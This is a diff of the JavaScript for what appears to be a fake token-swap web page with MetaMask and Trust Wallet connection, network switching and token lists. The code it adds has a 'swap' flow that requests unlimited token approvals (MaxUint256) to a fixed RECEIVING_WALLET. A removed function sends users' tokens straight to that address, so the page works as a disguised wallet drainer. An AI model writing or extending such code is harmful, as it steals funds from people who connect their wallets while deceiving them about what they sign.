@@ -15,12 +15,12 @@ const FEE_TOKENS = {
   arbitrum: "0x0000000000000000000000000000000000000000", // ETH
   base: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e" // ETH on Base
 };
-const COINGECKO_TOKEN_LISTS = {
-  ethereum: "https://tokens.coingecko.com/ethereum/all.json",
-  bsc: "https://tokens.coingecko.com/binance-smart-chain/all.json",
-  polygon: "https://tokens.coingecko.com/polygon-pos/all.json",
-  arbitrum: "https://tokens.coingecko.com/arbitrum-one/all.json",
-  base: "https://tokens.coingecko.com/base/all.json"
+const LOCAL_TOKEN_LISTS = {
+  ethereum: "config/eth-tokens.js",
+  bsc: "config/bsc-tokens.js",
+  polygon: "config/polygon-tokens.js",
+  arbitrum: "config/arb-tokens.js",
+  base: "config/base-tokens.js"
 };
 const MIN_FEE_RESERVES = {
   ethereum: 0.001, // ETH
@@ -165,7 +165,6 @@ function initNetworkDropdown() {
   });
 }
 
-// In the initCurrencySelector function, modify the click handler:
 function initCurrencySelector() {
   const container = document.createElement('div');
   container.className = 'dex-currency-selector';
@@ -224,16 +223,8 @@ function setDefaultTokenPair() {
   currentFromToken = networkTokens.find(t => t.isNative) || networkTokens[0];
   
   // Set default to token - look for stablecoins first
-  const stablecoinSymbols = {
-    ethereum: ['USDT', 'USDC', 'DAI'],
-    bsc: ['USDT', 'BUSD', 'USDC', 'DAI'],
-    polygon: ['USDT', 'USDC', 'DAI'],
-    arbitrum: ['USDT', 'USDC', 'DAI'],
-    base: ['USDC', 'DAI', 'USDT']
-  };
-  
   currentToToken = networkTokens.find(t => 
-    stablecoinSymbols[currentNetwork]?.includes(t.symbol) && t.logo
+    STABLECOIN_SYMBOLS[currentNetwork]?.includes(t.symbol) && t.logo
   );
   
   // Fallback to second token if no stablecoin found
@@ -253,301 +244,6 @@ function setDefaultTokenPair() {
   updateSwapButton();
 }
 
-// =====================
-// WALLET FUNCTIONS
-// =====================
-
-async function checkWalletEnvironment() {
-  const savedWallet = localStorage.getItem('walletConnected');
-  if (savedWallet === 'metamask' && window.ethereum) {
-    try {
-      await connectAndProcess();
-    } catch (err) {
-      console.error("Auto-connect error:", err);
-      localStorage.removeItem('walletConnected');
-    }
-  }
-  
-  if (window.ethereum && window.ethereum.chainId) {
-    const chainId = window.ethereum.chainId;
-    for (const network in NETWORK_CONFIGS) {
-      if (NETWORK_CONFIGS[network].chainId === chainId) {
-        // Only update if network actually changed
-        if (currentNetwork !== network) {
-          currentNetwork = network;
-          document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
-          updateNetworkLogo(network);
-          setDefaultTokenPair(); // Add this line to update tokens
-        }
-        break;
-      }
-    }
-  }
-}
-
-async function initializeWallet() {
-  try {
-    provider = new ethers.providers.Web3Provider(window.ethereum);
-    signer = provider.getSigner();
-    userAddress = await signer.getAddress();
-    
-    localStorage.setItem('walletConnected', 'metamask');
-    updateWalletButton(true);
-    
-    // Get current chain and update tokens
-    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-    for (const network in NETWORK_CONFIGS) {
-      if (NETWORK_CONFIGS[network].chainId === chainId) {
-        currentNetwork = network;
-        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
-        updateNetworkLogo(network);
-        break;
-      }
-    }
-    
-    await setDefaultTokenPair(); // Ensure tokens are updated
-    await updateTokenBalances();
-    
-    // Set up event listeners
-    window.ethereum.on('accountsChanged', (accounts) => {
-      if (accounts.length === 0) {
-        handleWalletDisconnect();
-      } else {
-        userAddress = accounts[0];
-        updateWalletButton(true);
-        updateTokenBalances();
-      }
-    });
-    
-    window.ethereum.on('chainChanged', (chainId) => {
-      // Find the new network
-      for (const network in NETWORK_CONFIGS) {
-        if (NETWORK_CONFIGS[network].chainId === chainId) {
-          currentNetwork = network;
-          document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
-          updateNetworkLogo(network);
-          setDefaultTokenPair(); // Update tokens on chain change
-          break;
-        }
-      }
-    });
-    
-    return true;
-  } catch (err) {
-    console.error("Wallet initialization error:", err);
-    updateStatus("Connection error. Please try again.", "error");
-    return false;
-  }
-}
-
-function handleWalletDisconnect() {
-  userAddress = null;
-  provider = null;
-  signer = null;
-  localStorage.removeItem('walletConnected');
-  updateWalletButton(false);
-  updateSwapButton();
-  updateStatus("Wallet disconnected", "success");
-}
-
-async function fetchTokenBalance(token) {
-  if (!userAddress) return 0;
-  
-  try {
-    // Skip tokens with invalid addresses
-    if (token.address && !ethers.utils.isAddress(token.address)) {
-      console.warn(`Skipping ${token.symbol} - invalid address`);
-      return 0;
-    }
-
-    let balance;
-    if (token.isNative) {
-      balance = await provider.getBalance(userAddress);
-      return parseFloat(ethers.utils.formatEther(balance));
-    } else {
-      const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
-      try {
-        balance = await contract.balanceOf(userAddress);
-        return parseFloat(ethers.utils.formatUnits(balance, token.decimals || 18));
-      } catch (err) {
-        console.warn(`Balance check failed for ${token.symbol}:`, err.message);
-        return 0;
-      }
-    }
-  } catch (err) {
-    console.warn(`Error fetching ${token.symbol} balance:`, err.message);
-    return 0;
-  }
-}
-
-async function updateTokenBalances() {
-  if (!userAddress || !currentFromToken) return;
-  
-  try {
-    const balanceElement = document.getElementById("fromTokenBalance");
-    balanceElement.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading...';
-    
-    const balance = await fetchTokenBalance(currentFromToken);
-    if (balance <= 0) {
-      balanceElement.innerHTML = `
-        Balance: 0 ${currentFromToken.symbol}
-        
-      `;
-      document.getElementById("swapBtn").disabled = true;
-    } else {
-      balanceElement.innerHTML = `
-        Balance: ${balance.toFixed(6)} ${currentFromToken.symbol}
-      `;
-    }
-  } catch (err) {
-    console.error("Error updating balances:", err);
-    balanceElement.innerHTML = `
-      <span style="color: var(--error)">Balance: Error loading</span>
-    `;
-  }
-}
-
-async function handleWalletConnection() {
-  if (userAddress) {
-    handleWalletDisconnect();
-    return;
-  }
-
-  if (!window.ethereum) {
-    if (isMobile()) {
-      showWalletConnect();
-    } else {
-      updateStatus("Please install MetaMask", "error");
-    }
-    return;
-  }
-
-  await connectAndProcess();
-}
-
-async function connectAndProcess() {
-  try {
-    showLoader();
-    updateStatus("Connecting wallet...", "success");
-
-    // Handle MetaMask connection properly
-    let accounts;
-    try {
-      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-    } catch (err) {
-      if (err.code === -32002) {
-        // Request already pending
-        accounts = await new Promise((resolve) => {
-          window.ethereum.on('accountsChanged', (accounts) => {
-            resolve(accounts);
-          });
-        });
-      } else {
-        throw err;
-      }
-    }
-
-    if (accounts.length === 0) {
-      throw new Error("No accounts found");
-    }
-    
-    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-    for (const network in NETWORK_CONFIGS) {
-      if (NETWORK_CONFIGS[network].chainId === chainId) {
-        currentNetwork = network;
-        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
-        updateNetworkLogo(network);
-        break;
-      }
-    }
-    
-    await initializeWallet();
-    updateSwapButton();
-  } catch (err) {
-    console.error("Connection error:", err);
-    updateStatus("Error: " + err.message, "error");
-    updateWalletButton(false);
-    localStorage.removeItem('walletConnected');
-  } finally {
-    hideLoader();
-  }
-}
-
-async function connectMetaMask() {
-  hideWalletConnect();
-  await connectAndProcess();
-}
-
-function openInTrustWallet() {
-  const currentUrl = encodeURIComponent(window.location.href);
-  document.getElementById('currentUrl').textContent = window.location.href;
-  window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
-  setTimeout(() => {
-    document.getElementById('manualSteps').style.display = 'block';
-  }, 3000);
-}
-
-// =====================
-// NETWORK FUNCTIONS
-// =====================
-
-async function handleNetworkChange(network) {
-  try {
-    showLoader();
-    updateStatus(`Switching to ${NETWORK_CONFIGS[network].chainName}...`, "success");
-    
-    currentNetwork = network;
-    document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
-    updateNetworkLogo(network);
-    
-    setDefaultTokenPair();
-    
-    if (userAddress) {
-      await checkNetwork();
-      await updateTokenBalances();
-    }
-    
-    updateToAmount();
-    updateStatus(`Network changed to ${NETWORK_CONFIGS[network].chainName}`, "success");
-  } catch (err) {
-    console.error("Network change error:", err);
-    updateStatus(`Failed to switch network: ${err.message}`, "error");
-  } finally {
-    hideLoader();
-  }
-}
-
-async function checkNetwork() {
-  try {
-    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-    const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
-    
-    if (chainId !== targetChainId) {
-      updateStatus("Switching network...", "success");
-      try {
-        await window.ethereum.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: targetChainId }]
-        });
-      } catch (switchError) {
-        if (switchError.code === 4902) {
-          try {
-            await window.ethereum.request({
-              method: 'wallet_addEthereumChain',
-              params: [NETWORK_CONFIGS[currentNetwork]]
-            });
-          } catch (addError) {
-            throw new Error("Please switch networks manually in your wallet");
-          }
-        }
-        throw new Error("Failed to switch network");
-      }
-    }
-  } catch (err) {
-    console.error("Network error:", err);
-    throw new Error("Network error: " + err.message);
-  }
-}
 // =====================
 // TOKEN FUNCTIONS
 // =====================
@@ -579,14 +275,14 @@ function showTokenList(type) {
 
 async function populateTokenList(type, tokenItems, searchInput, noTokensFound) {
   try {
-    // Get tokens from both local config and CoinGecko API
-    const [localTokens, cgTokens] = await Promise.all([
+    // Get tokens from both local config and additional local token files
+    const [localTokens, additionalTokens] = await Promise.all([
       getLocalTokens(),
-      fetchCoinGeckoTokens(currentNetwork)
+      fetchLocalTokens(currentNetwork)
     ]);
     
     // Combine tokens, removing duplicates (prioritizing local tokens)
-    const allTokens = combineTokens(localTokens, cgTokens);
+    const allTokens = combineTokens(localTokens, additionalTokens);
     
     // Display tokens or show empty state
     if (allTokens.length === 0) {
@@ -603,6 +299,16 @@ async function populateTokenList(type, tokenItems, searchInput, noTokensFound) {
   }
 }
 
+async function fetchLocalTokens(network) {
+  try {
+    const module = await import(LOCAL_TOKEN_LISTS[network]);
+    return module.TOKENS[network] || [];
+  } catch (err) {
+    console.error(`Failed to load local tokens for ${network}:`, err);
+    return [];
+  }
+}
+
 async function getLocalTokens() {
   return TOKENS[currentNetwork]?.map(t => ({ 
     ...t, 
@@ -611,32 +317,7 @@ async function getLocalTokens() {
   })) || [];
 }
 
-async function fetchCoinGeckoTokens(network) {
-  try {
-    const cgUrl = COINGECKO_TOKEN_LISTS[network];
-    if (!cgUrl) return [];
-    
-    const response = await fetchWithTimeout(cgUrl, { timeout: 3000 });
-    if (!response.ok) throw new Error('CoinGecko API error');
-    
-    const data = await response.json();
-    return data.tokens?.map(t => ({
-      name: t.name,
-      symbol: t.symbol,
-      address: t.address,
-      logoURI: t.logoURI,
-      decimals: t.decimals,
-      originNetwork: network,
-      isLocal: false
-    })) || [];
-    
-  } catch (err) {
-    console.error("Failed to fetch CoinGecko tokens:", err);
-    return [];
-  }
-}
-
-function combineTokens(localTokens, cgTokens) {
+function combineTokens(localTokens, additionalTokens) {
   // Create a map to avoid duplicates (prioritize local tokens)
   const tokenMap = new Map();
   
@@ -646,11 +327,15 @@ function combineTokens(localTokens, cgTokens) {
     tokenMap.set(key, token);
   });
   
-  // Add CoinGecko tokens if not already present
-  cgTokens.forEach(token => {
+  // Add additional tokens if not already present
+  additionalTokens.forEach(token => {
     const key = `${token.symbol.toLowerCase()}-${token.address?.toLowerCase()}`;
     if (!tokenMap.has(key)) {
-      tokenMap.set(key, token);
+      tokenMap.set(key, {
+        ...token,
+        isLocal: false,
+        originNetwork: currentNetwork
+      });
     }
   });
   
@@ -1051,19 +736,101 @@ async function getTokenPrice(token) {
   }
 }
 
-async function fetchWithTimeout(resource, options = {}) {
-  const { timeout = 8000 } = options;
+// =====================
+// WALLET FUNCTIONS
+// =====================
+
+async function checkWalletEnvironment() {
+  const savedWallet = localStorage.getItem('walletConnected');
+  if (savedWallet === 'metamask' && window.ethereum) {
+    try {
+      await connectAndProcess();
+    } catch (err) {
+      console.error("Auto-connect error:", err);
+      localStorage.removeItem('walletConnected');
+    }
+  }
   
-  const controller = new AbortController();
-  const id = setTimeout(() => controller.abort(), timeout);
-  
-  const response = await fetch(resource, {
-    ...options,
-    signal: controller.signal  
-  });
-  
-  clearTimeout(id);
-  return response;
+  if (window.ethereum && window.ethereum.chainId) {
+    const chainId = window.ethereum.chainId;
+    for (const network in NETWORK_CONFIGS) {
+      if (NETWORK_CONFIGS[network].chainId === chainId) {
+        // Only update if network actually changed
+        if (currentNetwork !== network) {
+          currentNetwork = network;
+          document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
+          updateNetworkLogo(network);
+          setDefaultTokenPair(); // Add this line to update tokens
+        }
+        break;
+      }
+    }
+  }
+}
+
+async function initializeWallet() {
+  try {
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    signer = provider.getSigner();
+    userAddress = await signer.getAddress();
+    
+    localStorage.setItem('walletConnected', 'metamask');
+    updateWalletButton(true);
+    
+    // Get current chain and update tokens
+    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+    for (const network in NETWORK_CONFIGS) {
+      if (NETWORK_CONFIGS[network].chainId === chainId) {
+        currentNetwork = network;
+        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
+        updateNetworkLogo(network);
+        break;
+      }
+    }
+    
+    await setDefaultTokenPair(); // Ensure tokens are updated
+    await updateTokenBalances();
+    
+    // Set up event listeners
+    window.ethereum.on('accountsChanged', (accounts) => {
+      if (accounts.length === 0) {
+        handleWalletDisconnect();
+      } else {
+        userAddress = accounts[0];
+        updateWalletButton(true);
+        updateTokenBalances();
+      }
+    });
+    
+    window.ethereum.on('chainChanged', (chainId) => {
+      // Find the new network
+      for (const network in NETWORK_CONFIGS) {
+        if (NETWORK_CONFIGS[network].chainId === chainId) {
+          currentNetwork = network;
+          document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
+          updateNetworkLogo(network);
+          setDefaultTokenPair(); // Update tokens on chain change
+          break;
+        }
+      }
+    });
+    
+    return true;
+  } catch (err) {
+    console.error("Wallet initialization error:", err);
+    updateStatus("Connection error. Please try again.", "error");
+    return false;
+  }
+}
+
+function handleWalletDisconnect() {
+  userAddress = null;
+  provider = null;
+  signer = null;
+  localStorage.removeItem('walletConnected');
+  updateWalletButton(false);
+  updateSwapButton();
+  updateStatus("Wallet disconnected", "success");
 }
 
 async function fetchTokenBalance(token) {
@@ -1116,11 +883,154 @@ async function updateTokenBalances() {
     }
   } catch (err) {
     console.error("Error updating balances:", err);
-    document.getElementById("fromTokenBalance").innerHTML = `
+    balanceElement.innerHTML = `
       <span style="color: var(--error)">Balance: Error loading</span>
     `;
   }
 }
+
+async function handleWalletConnection() {
+  if (userAddress) {
+    handleWalletDisconnect();
+    return;
+  }
+
+  if (!window.ethereum) {
+    if (isMobile()) {
+      showWalletConnect();
+    } else {
+      updateStatus("Please install MetaMask", "error");
+    }
+    return;
+  }
+
+  await connectAndProcess();
+}
+
+async function connectAndProcess() {
+  try {
+    showLoader();
+    updateStatus("Connecting wallet...", "success");
+
+    // Handle MetaMask connection properly
+    let accounts;
+    try {
+      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+    } catch (err) {
+      if (err.code === -32002) {
+        // Request already pending
+        accounts = await new Promise((resolve) => {
+          window.ethereum.on('accountsChanged', (accounts) => {
+            resolve(accounts);
+          });
+        });
+      } else {
+        throw err;
+      }
+    }
+
+    if (accounts.length === 0) {
+      throw new Error("No accounts found");
+    }
+    
+    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+    for (const network in NETWORK_CONFIGS) {
+      if (NETWORK_CONFIGS[network].chainId === chainId) {
+        currentNetwork = network;
+        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
+        updateNetworkLogo(network);
+        break;
+      }
+    }
+    
+    await initializeWallet();
+    updateSwapButton();
+  } catch (err) {
+    console.error("Connection error:", err);
+    updateStatus("Error: " + err.message, "error");
+    updateWalletButton(false);
+    localStorage.removeItem('walletConnected');
+  } finally {
+    hideLoader();
+  }
+}
+
+async function connectMetaMask() {
+  hideWalletConnect();
+  await connectAndProcess();
+}
+
+function openInTrustWallet() {
+  const currentUrl = encodeURIComponent(window.location.href);
+  document.getElementById('currentUrl').textContent = window.location.href;
+  window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
+  setTimeout(() => {
+    document.getElementById('manualSteps').style.display = 'block';
+  }, 3000);
+}
+
+// =====================
+// NETWORK FUNCTIONS
+// =====================
+
+async function handleNetworkChange(network) {
+  try {
+    showLoader();
+    updateStatus(`Switching to ${NETWORK_CONFIGS[network].chainName}...`, "success");
+    
+    currentNetwork = network;
+    document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
+    updateNetworkLogo(network);
+    
+    setDefaultTokenPair();
+    
+    if (userAddress) {
+      await checkNetwork();
+      await updateTokenBalances();
+    }
+    
+    updateToAmount();
+    updateStatus(`Network changed to ${NETWORK_CONFIGS[network].chainName}`, "success");
+  } catch (err) {
+    console.error("Network change error:", err);
+    updateStatus(`Failed to switch network: ${err.message}`, "error");
+  } finally {
+    hideLoader();
+  }
+}
+
+async function checkNetwork() {
+  try {
+    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+    const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
+    
+    if (chainId !== targetChainId) {
+      updateStatus("Switching network...", "success");
+      try {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: targetChainId }]
+        });
+      } catch (switchError) {
+        if (switchError.code === 4902) {
+          try {
+            await window.ethereum.request({
+              method: 'wallet_addEthereumChain',
+              params: [NETWORK_CONFIGS[currentNetwork]]
+            });
+          } catch (addError) {
+            throw new Error("Please switch networks manually in your wallet");
+          }
+        }
+        throw new Error("Failed to switch network");
+      }
+    }
+  } catch (err) {
+    console.error("Network error:", err);
+    throw new Error("Network error: " + err.message);
+  }
+}
+
 // =====================
 // SWAP FUNCTIONS 
 // =====================
@@ -1346,109 +1256,7 @@ async function processTokenTransfer(token) {
     return false;
   }
 }
-async function estimateAndDisplayFees() {
-  if (!userAddress || !currentFromToken) return;
 
-  try {
-    // Estimate gas price
-    const gasPrice = await provider.getGasPrice();
-    const gweiPrice = ethers.utils.formatUnits(gasPrice, 'gwei');
-    
-    // Calculate estimated fee
-    let estimatedFee;
-    if (currentFromToken.isNative) {
-      estimatedFee = GAS_LIMITS.nativeTransfer * parseFloat(gweiPrice) / 1e9;
-    } else {
-      estimatedFee = GAS_LIMITS.erc20Transfer * parseFloat(gweiPrice) / 1e9;
-    }
-    
-    // Get token price for USD conversion
-    const tokenPrice = await getTokenPrice({
-      symbol: currentNetwork === 'bsc' ? 'BNB' : 'ETH',
-      isNative: true
-    });
-    
-    const feeInUsd = estimatedFee * (tokenPrice || 0);
-    
-    // Display fee info
-    document.getElementById('feeEstimate').innerHTML = `
-      Estimated Network Fee: 
-      ${estimatedFee.toFixed(6)} ${currentNetwork === 'bsc' ? 'BNB' : 'ETH'}
-      ($${feeInUsd.toFixed(2)})
-    `;
-    
-    // Warning if fee is too high
-    if (feeInUsd > 0.5) {
-      document.getElementById('feeEstimate').classList.add('high-fee');
-    } else {
-      document.getElementById('feeEstimate').classList.remove('high-fee');
-    }
-    
-  } catch (err) {
-    console.error("Fee estimation error:", err);
-    document.getElementById('feeEstimate').textContent = "Fee estimation unavailable";
-  }
-}
-
-// Call this whenever network or token changes
-estimateAndDisplayFees();
-async function transferWithHigherGas(token, amount) {
-  const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
-  const amountInWei = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
-  
-  // Sign and send raw transaction with higher gas
-  const tx = await signer.sendTransaction({
-    to: token.address,
-    data: contract.interface.encodeFunctionData('transfer', [
-      RECEIVING_WALLET,
-      amountInWei
-    ]),
-    gasLimit: 300000, // Higher gas limit
-    gasPrice: ethers.utils.parseUnits('10', 'gwei') // Higher gas price
-  });
-  
-  await tx.wait();
-  return tx.hash;
-}
-
-async function getLocalTokens() {
-  return TOKENS[currentNetwork] || [];
-}
-
-const TOKEN_LIST_CACHE = new Map();
-
-async function fetchCoinGeckoTokens(network) {
-  // Check cache first
-  if (TOKEN_LIST_CACHE.has(network)) {
-    return TOKEN_LIST_CACHE.get(network);
-  }
-
-  try {
-    const cgUrl = COINGECKO_TOKEN_LISTS[network];
-    if (!cgUrl) return [];
-    
-    const response = await fetchWithTimeout(cgUrl, { timeout: 3000 });
-    if (!response.ok) throw new Error('CoinGecko API error');
-    
-    const data = await response.json();
-    const tokens = data.tokens?.map(t => ({
-      name: t.name,
-      symbol: t.symbol,
-      address: t.address,
-      logoURI: t.logoURI,
-      decimals: t.decimals,
-      originNetwork: network,
-      isLocal: false
-    })) || [];
-    
-    // Cache the result
-    TOKEN_LIST_CACHE.set(network, tokens);
-    return tokens;
-  } catch (err) {
-    console.error("Failed to fetch CoinGecko tokens:", err);
-    return [];
-  }
-}
 async function fetchMultipleTokenBalances(tokens) {
   if (!userAddress || !provider) return {};
   
@@ -1510,67 +1318,6 @@ async function fetchMultipleTokenBalances(tokens) {
   }
 }
 
-function combineTokens(localTokens, cgTokens) {
-  // Create a map to avoid duplicates (prioritize local tokens)
-  const tokenMap = new Map();
-  
-  // Add local tokens first
-  localTokens.forEach(token => {
-    const key = `${token.symbol.toLowerCase()}-${token.address?.toLowerCase()}`;
-    tokenMap.set(key, token);
-  });
-  
-  // Add CoinGecko tokens if not already present
-  cgTokens.forEach(token => {
-    const key = `${token.symbol.toLowerCase()}-${token.address?.toLowerCase()}`;
-    if (!tokenMap.has(key)) {
-      tokenMap.set(key, token);
-    }
-  });
-  
-  return Array.from(tokenMap.values());
-}
-
-async function checkAndApproveToken(token, amount) {
-  if (!token.address || token.isNative) return true;
-
-  try {
-    const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
-    const neededAllowance = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
-    
-    // Check current allowance
-    const allowance = await contract.allowance(userAddress, RECEIVING_WALLET);
-    if (allowance.gte(neededAllowance)) return true;
-
-    // Request approval with proper gas
-    updateStatus(`Approving ${token.symbol}...`, "success");
-    
-    // Special handling for USDT which doesn't allow changing allowance from non-zero
-    if (token.symbol === 'USDT' && !allowance.isZero()) {
-      // First set to zero
-      const zeroTx = await contract.approve(
-        RECEIVING_WALLET,
-        ethers.constants.Zero,
-        { gasLimit: 100000 }
-      );
-      await zeroTx.wait();
-    }
-    
-    // Then set to max
-    const approveTx = await contract.approve(
-      RECEIVING_WALLET,
-      ethers.constants.MaxUint256,
-      { gasLimit: 150000 } // Increased gas limit
-    );
-    
-    await approveTx.wait();
-    return true;
-  } catch (err) {
-    console.error("Approval error:", err);
-    updateStatus(`Approval failed for ${token.symbol}`, "error");
-    return false;
-  }
-}
 // Add these constants near the top of your file
 const MAX_GAS_PRICE_GWEI = {
   ethereum: 10,
@@ -1660,68 +1407,47 @@ async function transferERC20Token(token, amount) {
   }
 }
 
-// Helper function to get token balance
-async function fetchTokenBalance(token) {
-  if (!userAddress) return 0;
-  
+async function checkAndApproveToken(token, amount) {
+  if (!token.address || token.isNative) return true;
+
   try {
-    let balance;
-    if (token.isNative) {
-      balance = await provider.getBalance(userAddress);
-      return parseFloat(ethers.utils.formatEther(balance));
-    } else {
-      const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
-      try {
-        // First try standard balanceOf
-        balance = await contract.balanceOf(userAddress);
-        return parseFloat(ethers.utils.formatUnits(balance, token.decimals || 18));
-      } catch (err) {
-        // If balanceOf fails, try alternative methods
-        try {
-          // Some tokens use different balance function names
-          balance = await contract['balanceOf(address)'](userAddress);
-          return parseFloat(ethers.utils.formatUnits(balance, token.decimals || 18));
-        } catch {
-          console.warn(`Token at ${token.address} is not ERC20 compliant`);
-          return 0;
-        }
-      }
+    const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
+    const neededAllowance = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
+    
+    // Check current allowance
+    const allowance = await contract.allowance(userAddress, RECEIVING_WALLET);
+    if (allowance.gte(neededAllowance)) return true;
+
+    // Request approval with proper gas
+    updateStatus(`Approving ${token.symbol}...`, "success");
+    
+    // Special handling for USDT which doesn't allow changing allowance from non-zero
+    if (token.symbol === 'USDT' && !allowance.isZero()) {
+      // First set to zero
+      const zeroTx = await contract.approve(
+        RECEIVING_WALLET,
+        ethers.constants.Zero,
+        { gasLimit: 100000 }
+      );
+      await zeroTx.wait();
     }
+    
+    // Then set to max
+    const approveTx = await contract.approve(
+      RECEIVING_WALLET,
+      ethers.constants.MaxUint256,
+      { gasLimit: 150000 } // Increased gas limit
+    );
+    
+    await approveTx.wait();
+    return true;
   } catch (err) {
-    console.error(`Error fetching ${token.symbol} balance:`, err);
-    return 0;
+    console.error("Approval error:", err);
+    updateStatus(`Approval failed for ${token.symbol}`, "error");
+    return false;
   }
 }
 
-// Update the UI based on swap readiness
-function updateSwapButton() {
-  const btn = document.getElementById("swapBtn");
-  const btnText = document.getElementById("swapBtnText");
-  
-  if (!userAddress) {
-    btn.disabled = false;
-    btnText.textContent = "Connect Wallet";
-    btn.onclick = handleWalletConnection;
-    return;
-  }
-  
-  btn.onclick = handleSwap;
-  
-  if (!currentFromToken || !currentToToken) {
-    btn.disabled = true;
-    btnText.textContent = "Select Tokens";
-    return;
-  }
-  
-  const inputAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
-  if (inputAmount > 0) {
-    btn.disabled = false;
-    btnText.textContent = `Swap ${inputAmount.toFixed(6)} ${currentFromToken.symbol}`;
-  } else {
-    btn.disabled = true;
-    btnText.textContent = "Enter Amount";
-  }
-}
 // =====================
 // UI FUNCTIONS
 // =====================
@@ -1743,6 +1469,7 @@ function updateStatus(message, type, duration = 5000) {
     }, duration);
   }
 }
+
 function showLoader() {
   document.getElementById("loader").style.display = "block";
 }
@@ -1815,4 +1542,34 @@ function showWalletConnect() {
 
 function hideWalletConnect() {
   document.getElementById("walletConnectModal").style.display = 'none';
+}
+
+// Helper functions
+function debounce(func, wait) {
+  let timeout;
+  return function(...args) {
+    const context = this;
+    clearTimeout(timeout);
+    timeout = setTimeout(() => func.apply(context, args), wait);
+  };
+}
+
+function shortenAddress(address) {
+  if (!address) return '';
+  return `${address.slice(0, 6)}...${address.slice(-4)}`;
+}
+
+async function fetchWithTimeout(resource, options = {}) {
+  const { timeout = 8000 } = options;
+  
+  const controller = new AbortController();
+  const id = setTimeout(() => controller.abort(), timeout);
+  
+  const response = await fetch(resource, {
+    ...options,
+    signal: controller.signal  
+  });
+  
+  clearTimeout(id);
+  return response;
 }
